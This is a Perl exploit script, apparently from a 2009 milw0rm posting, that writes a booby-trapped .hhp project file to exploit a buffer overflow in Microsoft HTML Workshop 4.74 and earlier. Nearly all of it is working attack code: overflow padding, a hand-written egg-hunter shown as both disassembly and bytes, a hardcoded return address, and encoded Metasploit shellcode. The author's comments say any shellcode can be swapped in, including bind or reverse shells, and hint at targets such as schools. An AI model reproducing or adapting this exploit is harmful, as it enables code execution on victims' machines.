#!/usr/bin/perl
# Microsoft HTML Workshop <= 4.74 Universal Buffer Overflow Exploit
# -----------------------------------------------------------------
# Discovered/Exploit by SkD                    (skdrat@hotmail.com)
# -----------------------------------------------------------------
#
# This is a continuation of my new method, shellhunting.
# The exploit is far more advanced than the Amaya's as it runs on
# every system, partly because the shellhunter itself is very much
# reliable and universal.
# The shellhunter does the following tasks to find and exec.
# shellcode:-
#
# 1- Searches through the whole memory of the application.
# 2- Installs a SEH handler so on access violations it won't
#    stop hunting for the shellcode.
# 3- Repairs stack so a stack overflow won't occur (that is what
#    happens when the SEH is called up, many PUSH instructions
#    are called from the relevant modules (ntdll, etc).
# 4- Improved speed by searching through 32 bytes at a time.
# 5- Uses a certain address in memory to store a variable for the
#    search.
#
# It is very stable and will allow any shellcode (bind/reverse shell,
# dl/exec). It will work on ALL Windows NT versions (2k, XP, Vista).
#
# Yeah, I guess that's about it. Took me a few hours to figure out the
# whole thing but nothing is impossible ;).
#
# Oh, I think some schools use this software :) (it's Microsoft's, right?).
#
# You can download the app. from Microsoft's official page:
# ->  http://msdn.microsoft.com/en-us/library/ms669985.aspx
#
# If you are interested in my method and want to learn something new or
# improve your exploitation skills then visit my team's blog at:
# ->  http://abysssec.com
#
# Peace out,
# SkD.



my $hhp_data1 = "\x5B\x4F\x50\x54\x49\x4F\x4E\x53".
	        "\x5D\x0D\x0A\x43\x6F\x6E\x74\x65".
                "\x6E\x74\x73\x20\x66\x69\x6C\x65".
                "\x3D\x41\x0D\x0A\x49\x6E\x64\x65".
	        "\x78\x20\x66\x69\x6C\x65\x3D";
my $hhp_data2 = "\x5B\x46\x49\x4C\x45\x53\x5D\x0D".
		"\x0A\x61\x2E\x68\x74\x6D";
my $crlf      = "\x0d\x0a";

# win32_exec -  EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com
my $shellcode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49".
"\x49\x49\x49\x49\x49\x49\x49\x48\x49\x49\x49\x49\x51\x5a\x6a\x46".
"\x58\x30\x42\x30\x50\x42\x6b\x42\x41\x56\x42\x32\x42\x41\x41\x32".
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x58\x69\x69\x6c\x4b".
"\x58\x62\x64\x65\x50\x67\x70\x47\x70\x6c\x4b\x42\x65\x45\x6c\x6e".
"\x6b\x73\x4c\x53\x35\x73\x48\x45\x51\x4a\x4f\x6c\x4b\x70\x4f\x52".
"\x38\x4c\x4b\x33\x6f\x55\x70\x57\x71\x6a\x4b\x61\x59\x4c\x4b\x36".
"\x54\x6e\x6b\x53\x31\x48\x6e\x55\x61\x39\x50\x4d\x49\x4c\x6c\x4d".
"\x54\x6b\x70\x74\x34\x66\x67\x4b\x71\x78\x4a\x56\x6d\x67\x71\x39".
"\x52\x48\x6b\x4c\x34\x35\x6b\x62\x74\x56\x44\x57\x74\x54\x35\x6b".
"\x55\x4e\x6b\x31\x4f\x65\x74\x67\x71\x5a\x4b\x50\x66\x6c\x4b\x56".
"\x6c\x42\x6b\x6e\x6b\x53\x6f\x47\x6c\x67\x71\x7a\x4b\x6c\x4b\x45".
"\x4c\x6c\x4b\x47\x71\x48\x6b\x4f\x79\x33\x6c\x44\x64\x73\x34\x49".
"\x53\x70\x31\x6b\x70\x71\x74\x4e\x6b\x73\x70\x56\x50\x4b\x35\x49".
"\x50\x62\x58\x66\x6c\x4c\x4b\x43\x70\x56\x6c\x4c\x4b\x50\x70\x45".
"\x4c\x4c\x6d\x6c\x4b\x35\x38\x77\x78\x78\x6b\x67\x79\x4e\x6b\x6b".
"\x30\x6c\x70\x57\x70\x63\x30\x33\x30\x4c\x4b\x32\x48\x67\x4c\x73".
"\x6f\x35\x61\x48\x76\x71\x70\x56\x36\x6c\x49\x4a\x58\x6e\x63\x69".
"\x50\x41\x6b\x56\x30\x65\x38\x6c\x30\x6f\x7a\x75\x54\x73\x6f\x31".
"\x78\x4e\x78\x79\x6e\x6f\x7a\x36\x6e\x66\x37\x6b\x4f\x5a\x47\x52".
"\x43\x65\x31\x30\x6c\x70\x63\x45\x50\x46";


#/----------------Advanced Shellhunter Code----------------\
#01D717DD   EB 1E            JMP SHORT 01D717FD            |
#01D717DF   83C4 64          ADD ESP,64                    |
#01D717E2   83C4 64          ADD ESP,64                    |
#01D717E5   83C4 64          ADD ESP,64                    |
#01D717E8   83C4 64          ADD ESP,64                    |
#01D717EB   83C4 64          ADD ESP,64                    |
#01D717EE   83C4 64          ADD ESP,64                    |
#01D717F1   83C4 64          ADD ESP,64                    |
#01D717F4   83C4 64          ADD ESP,64                    |
#01D717F7   83C4 64          ADD ESP,64                    |
#01D717FA   83C4 54          ADD ESP,54                    |
#01D717FD   33FF             XOR EDI,EDI                   |
#01D717FF   BA D0FAFD7F      MOV EDX,7FFDFAD0              |
#01D71804   8B3A             MOV EDI,DWORD PTR DS:[EDX]    |
#01D71806   EB 0E            JMP SHORT 01D71816            |
#01D71808   58               POP EAX                       |
#01D71809   83E8 3C          SUB EAX,3C                    |
#01D7180C   50               PUSH EAX                      |
#01D7180D   6A FF            PUSH -1                       |
#01D7180F   33DB             XOR EBX,EBX                   |
#01D71811   64:8923          MOV DWORD PTR FS:[EBX],ESP    |
#01D71814   EB 05            JMP SHORT 01D7181B            |
#01D71816   E8 EDFFFFFF      CALL 01D71808                 |
#01D7181B   B8 12121212      MOV EAX,12121212              |
#01D71820   6BC0 02          IMUL EAX,EAX,2                |
#01D71823   BA D0FAFD7F      MOV EDX,7FFDFAD0              |
#01D71828   83C7 20          ADD EDI,20                    |
#01D7182B   893A             MOV DWORD PTR DS:[EDX],EDI    |
#01D7182D   3907             CMP DWORD PTR DS:[EDI],EAX    |
#01D7182F  ^75 F7            JNZ SHORT 01D71828            |
#01D71831   83C7 04          ADD EDI,4                     |
#01D71834   6BC0 02          IMUL EAX,EAX,2                |
#01D71837   3907             CMP DWORD PTR DS:[EDI],EAX    |
#01D71839  ^75 E0            JNZ SHORT 01D7181B            |
#01D7183B   83C7 04          ADD EDI,4                     |
#01D7183E   B8 42424242      MOV EAX,42424242              |
#01D71843   3907             CMP DWORD PTR DS:[EDI],EAX    |
#01D71845  ^75 D4            JNZ SHORT 01D7181B            |
#01D71847   83C7 04          ADD EDI,4                     |
#01D7184A   FFE7             JMP EDI                       |
#\-----------------------End of Code----------------------/

my $shellhunter = "\xeb\x1e".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x64".
                  "\x83\xc4\x54".
		  "\x33\xff".
		  "\xba\xd0\xfa\xfd\x7f".
                  "\x8b\x3a".
                  "\xeb\x0e".
                  "\x58".
                  "\x83\xe8\x3c".
                  "\x50".
                  "\x6a\xff".
                  "\x33\xdb".
                  "\x64\x89\x23".
                  "\xeb\x05".
                  "\xe8\xed\xff\xff\xff".
                  "\xb8\x12\x12\x12\x12".
                  "\x6b\xc0\x02".
                  "\xba\xd0\xfa\xfd\x7f".
                  "\x83\xc7\x20".
                  "\x89\x3a".
                  "\x39\x07".
                  "\x75\xf7".
                  "\x83\xc7\x04".
                  "\x6b\xc0\x02".
                  "\x39\x07".
                  "\x75\xe0".
                  "\x83\xc7\x04".
                  "\xb8\x42\x42\x42\x42".
                  "\x39\x07".
                  "\x75\xd4".
                  "\x83\xc7\x04".
                  "\xff\xe7";
my $lookout1 = "\x24\x24\x24\x24\x48\x48\x48\x48\x42\x42\x42\x42" x 64;
my $lookout2 = "\x24\x24\x24\x24\x48\x48\x48\x48\x42\x42\x42\x42\x42" x 64;
my $lookout3 = "\x24\x24\x24\x24\x48\x48\x48\x48\x42\x42\x42\x42\x42\x42" x 64;
my $lookout4 = "\x24\x24\x24\x24\x48\x48\x48\x48\x42\x42\x42\x42\x42\x42\x42" x 64;
my $len = 280 - (length($shellhunter) + 55);
my $overflow1 = "\x41" x $len;
my $overflow2 = "\x41" x 55;
my $overflow3 = "\x42" x 256;
my $ret = "\x93\x1f\x40\x00"; #0x00401f93   CALL EDI [hhw.exe]


open(my $hhpprj_file, "> s.hhp");
print $hhpprj_file $hhp_data1.
		   $overflow1.$shellhunter.$overflow2.$ret.
                   $crlf.$crlf.
                   $hhp_data2.
                   $overflow3.$lookout1.$lookout2.$lookout3.$lookout4.$shellcode.$overflow3.
                   $crlf;
close $hhpprj_file;

# milw0rm.com [2009-01-12]
